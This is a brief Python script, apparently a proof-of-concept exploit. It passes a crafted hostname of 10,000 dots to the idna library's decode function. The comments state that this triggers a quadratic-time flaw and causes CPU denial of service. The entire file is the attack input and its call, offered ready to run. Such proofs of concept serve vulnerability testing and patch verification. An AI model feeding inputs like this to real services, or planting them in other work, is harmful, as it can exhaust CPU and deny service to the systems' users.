# Import the idna module
import idna

# Define a malicious hostname
# This hostname has 10000 dots
hostname = "." * 10000

# Try to decode the hostname using the idna module
# This will trigger the vulnerability in the idna.py module
# The decode function will use a quadratic algorithm
# This will result in a CPU denial of service
idna.decode(hostname)